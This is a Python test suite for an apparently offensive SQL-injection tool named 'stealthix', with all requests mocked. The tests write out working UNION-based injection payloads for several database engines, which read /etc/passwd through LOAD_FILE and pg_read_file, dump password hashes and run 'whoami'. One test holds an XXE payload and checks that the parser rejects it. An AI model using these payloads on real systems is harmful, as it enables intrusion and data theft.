from stealthix.core.session import ScanSession, SessionConfig
from stealthix.extraction import (
    dump_table,
    enumerate_columns,
    enumerate_databases,
    enumerate_tables,
    execute_command,
    extract_hashes,
    read_file,
)
from stealthix.extraction.base import _extract_values
from stealthix.plugins.runtime import plugin_to_dict
from stealthix.plugins.selector import select_plugin


def test_extraction_flows(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com"))

    def fake_request(*args, **kwargs):
        return (
            "database: appdb table_name: users column_name: id hash: d41d8cd98f00b204e9800998ecf8427e",
            0.01,
        )

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.tables._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.columns._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.dump._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.files._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.os._make_request", fake_request)
    monkeypatch.setattr("stealthix.extraction.hashes._make_request", fake_request)

    assert "appdb" in enumerate_databases(session)["databases"]
    assert "users" in enumerate_tables(session)["tables"]
    assert "id" in enumerate_columns(session)["columns"]
    assert dump_table(session, "users", ["id"])["rows"]
    assert "d41d8cd98f00b204e9800998ecf8427e" in extract_hashes(session)["hashes"]
    assert read_file(session, "/etc/passwd")["content"]
    assert execute_command(session, "whoami")["output"]


def test_sqlite_columns_parsing(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", dbms="sqlite"))

    def fake_request(*args, **kwargs):
        return "CREATE TABLE users(id integer, username text, password text);", 0.01

    monkeypatch.setattr("stealthix.extraction.columns._make_request", fake_request)
    results = enumerate_columns(session, table="users")
    assert "id" in results["columns"]


def test_extraction_json_parsing(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com"))

    def fake_request(*args, **kwargs):
        return '{"database":"appdb","tables":["users"]}', 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    result = enumerate_databases(session)
    assert "appdb" in result["databases"]
    assert result["success"] is True
    assert result["count"] == 1
    assert result["selected_payload"]
    assert result["responses"][0]["elapsed"] == 0.01


def test_extraction_xml_parsing(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com"))

    def fake_request(*args, **kwargs):
        return "<root><database>appdb</database></root>", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    assert "appdb" in enumerate_databases(session)["databases"]


def test_extraction_xml_parser_rejects_external_entities():
    xml = """<?xml version="1.0"?>
    <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <root><database>&xxe;</database></root>
    """

    assert _extract_values(xml) == []


def test_extraction_html_parsing(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com"))

    def fake_request(*args, **kwargs):
        return "<table><tr><th>database</th></tr><tr><td>appdb</td></tr></table>", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    assert "appdb" in enumerate_databases(session)["databases"]


def test_extraction_profile_overrides_database_payload(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "databases": {
                "payloads": ["PROFILE_DB_PAYLOAD"],
                "patterns": [r"database[:=\s]+([a-z0-9_]+)"],
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "PROFILE_DB_PAYLOAD"
        return "database: appdb", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    assert "appdb" in enumerate_databases(session)["databases"]


def test_extraction_profile_file_template(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "files": {"payloads": ["' UNION SELECT pg_read_file('{path}',0,10)--"]}
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert "pg_read_file" in (data or {}).get("id", "")
        assert "/etc/passwd" in (data or {}).get("id", "")
        return "ok", 0.01

    monkeypatch.setattr("stealthix.extraction.files._make_request", fake_request)
    assert read_file(session, "/etc/passwd")["content"] == "ok"


def test_extraction_profile_mssql_db_payload(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "databases": {
                "payloads": ["' UNION SELECT name FROM master..sysdatabases--"],
                "patterns": [r"name[:=\s]+([a-z0-9_]+)"],
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "' UNION SELECT name FROM master..sysdatabases--"
        return "name: master", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    assert "master" in enumerate_databases(session)["databases"]


def test_extraction_profile_sqlite_databases_returns_main(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "databases": {"payloads": ["' UNION SELECT 'main'--"], "patterns": [r"(main)"]}
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "' UNION SELECT 'main'--"
        return "main", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    assert "main" in enumerate_databases(session)["databases"]


def test_extraction_profile_oracle_files_disabled(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {"extraction_profiles": {"files": {"disabled": True}}}

    def fail_request(*_args, **_kwargs):
        raise AssertionError("should not request when disabled")

    monkeypatch.setattr("stealthix.extraction.files._make_request", fail_request)
    result = read_file(session, "/etc/passwd")
    assert result["content"] == ""
    assert result["success"] is False
    assert result["warnings"]


def test_extraction_profile_mariadb_tables(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "tables": {
                "payloads": ["' UNION SELECT table_name FROM information_schema.tables--"],
                "patterns": [r"table_name[:=\s]+([a-z0-9_]+)"],
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert "information_schema.tables" in (data or {}).get("id", "")
        return "table_name: users", 0.01

    monkeypatch.setattr("stealthix.extraction.tables._make_request", fake_request)
    assert "users" in enumerate_tables(session)["tables"]


def test_extraction_profile_db2_tables(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "tables": {
                "payloads": ["' UNION SELECT tabname FROM syscat.tables--"],
                "patterns": [r"tabname[:=\s]+([a-z0-9_]+)"],
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert "syscat.tables" in (data or {}).get("id", "")
        return "tabname: EMP", 0.01

    monkeypatch.setattr("stealthix.extraction.tables._make_request", fake_request)
    assert "emp" in [t.lower() for t in enumerate_tables(session)["tables"]]


def test_extraction_profile_files_tries_multiple_templates(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "files": {
                "payloads": [
                    "' UNION SELECT LOAD_FILE('{path}')--",
                    "' UNION SELECT pg_read_file('{path}',0,10)--",
                ]
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        payload = (data or {}).get("id", "")
        if "LOAD_FILE" in payload:
            return "", 0.01
        return "ok", 0.01

    monkeypatch.setattr("stealthix.extraction.files._make_request", fake_request)
    out = read_file(session, "/etc/passwd")
    assert out["content"] == "ok"
    assert len(out["payloads"]) == 2


def test_extraction_skips_db_error_bodies_and_uses_next_payload(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {
            "files": {
                "payloads": [
                    "' UNION SELECT bad('{path}')--",
                    "' UNION SELECT LOAD_FILE('{path}')--",
                ]
            }
        }
    }

    def fake_request(_session, _url, data=None, method=None):
        payload = (data or {}).get("id", "")
        if "bad(" in payload:
            return "SQLSTATE[42000] syntax error near bad", 0.01
        return "root:x:0:0:root:/root:/bin/bash", 0.01

    monkeypatch.setattr("stealthix.extraction.files._make_request", fake_request)
    result = read_file(session, "/etc/passwd")
    assert result["success"] is True
    assert result["selected_payload"] and "LOAD_FILE" in result["selected_payload"]
    assert result["responses"][0]["error_hints"]


def test_dump_parses_json_rows(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id")
        return '{"rows": [{"id": 1, "username": "alice"}]}', 0.01

    monkeypatch.setattr("stealthix.extraction.dump._make_request", fake_request)
    result = dump_table(session, "users", ["id", "username"])
    assert result["success"] is True
    assert result["count"] == 1
    assert result["rows"][0]["id"] == 1
    assert result["selected_payload"]


def test_hash_extraction_supports_profile_payloads(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST"))
    session.metadata["plugin"] = {
        "extraction_profiles": {"hashes": {"payloads": ["' UNION SELECT password FROM users--"]}}
    }

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "' UNION SELECT password FROM users--"
        return "5f4dcc3b5aa765d61d8327deb882cf99", 0.01

    monkeypatch.setattr("stealthix.extraction.hashes._make_request", fake_request)
    result = extract_hashes(session)
    assert result["success"] is True
    assert result["hashes"] == ["5f4dcc3b5aa765d61d8327deb882cf99"]


def test_cockroachdb_uses_pg_style_extraction_profiles(monkeypatch):
    session = ScanSession(
        SessionConfig(base_url="http://example.com", method="POST", dbms="cockroachdb")
    )
    plugin = select_plugin("cockroachdb")
    assert plugin is not None
    session.metadata["plugin"] = plugin_to_dict(plugin)

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "' UNION SELECT datname FROM pg_database--"
        return "datname: appdb", 0.01

    monkeypatch.setattr("stealthix.extraction.databases._make_request", fake_request)
    result = enumerate_databases(session)
    assert result["success"] is True
    assert "appdb" in result["databases"]


def test_tidb_uses_mysql_style_file_profile(monkeypatch):
    session = ScanSession(SessionConfig(base_url="http://example.com", method="POST", dbms="tidb"))
    plugin = select_plugin("tidb")
    assert plugin is not None
    session.metadata["plugin"] = plugin_to_dict(plugin)

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert "LOAD_FILE('/etc/passwd')" in (data or {}).get("id", "")
        return "ok", 0.01

    monkeypatch.setattr("stealthix.extraction.files._make_request", fake_request)
    result = read_file(session, "/etc/passwd")
    assert result["success"] is True
    assert result["content"] == "ok"


def test_yugabytedb_uses_pg_style_table_profile(monkeypatch):
    session = ScanSession(
        SessionConfig(base_url="http://example.com", method="POST", dbms="yugabytedb")
    )
    plugin = select_plugin("yugabytedb")
    assert plugin is not None
    session.metadata["plugin"] = plugin_to_dict(plugin)

    def fake_request(_session, _url, data=None, method=None):
        assert method == "POST"
        assert (data or {}).get("id") == "' UNION SELECT tablename FROM pg_tables--"
        return "tablename: accounts", 0.01

    monkeypatch.setattr("stealthix.extraction.tables._make_request", fake_request)
    result = enumerate_tables(session)
    assert result["success"] is True
    assert "accounts" in result["tables"]
